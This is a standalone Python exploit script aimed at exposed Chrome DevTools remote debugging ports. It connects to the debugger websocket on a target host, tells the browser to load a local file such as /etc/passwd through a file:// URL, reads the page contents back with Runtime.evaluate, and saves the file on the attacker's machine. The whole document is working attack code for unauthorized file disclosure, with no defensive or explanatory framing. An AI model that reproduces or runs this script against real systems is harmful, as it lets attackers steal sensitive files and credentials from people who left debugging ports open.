import requests
import json
import sys
import websockets
import asyncio
import random

if len(sys.argv) != 4:
    print("(+) usage: %s <target> <port> <file_path>" % sys.argv[0])
    print("(+) python %s 10.10.10.10 50000 /etc/passwd" % sys.argv[0])

target = sys.argv[1]
port = sys.argv[2]
file_path = sys.argv[3]

print("(+) Retrieving webscoket debugger url ")
r = requests.get("http://%s:%s/json" % (target, port))
link = r.json()[0]['webSocketDebuggerUrl']
request_id = random.randint(1, 1000000)

async def load_file():
    print("(+) Loading file://%s" % file_path)
    async with websockets.connect("%s" % link) as websocket:
        await websocket.send(json.dumps({"id":request_id,"method":"Page.navigate","params":{"url":"file://%s" % file_path}}))
        message = await websocket.recv()

async def download_file():
    print("(+) Retrieving file")
    async with websockets.connect("%s" % link) as websocket:
        await websocket.send(json.dumps(({"id":request_id + 1,"method":"Runtime.evaluate","params":{"expression":"document.documentElement.outerHTML"}})))
        message = await websocket.recv()
        return message

asyncio.get_event_loop().run_until_complete(load_file())
stream = asyncio.get_event_loop().run_until_complete(download_file())

with open("%s" % file_path.split("/")[-1],"w") as f:
    f.write(json.loads(stream)['result']['result']['value'])
    print("(+) Stored file %s at ./%s" % (file_path, file_path.split("/")[-1]))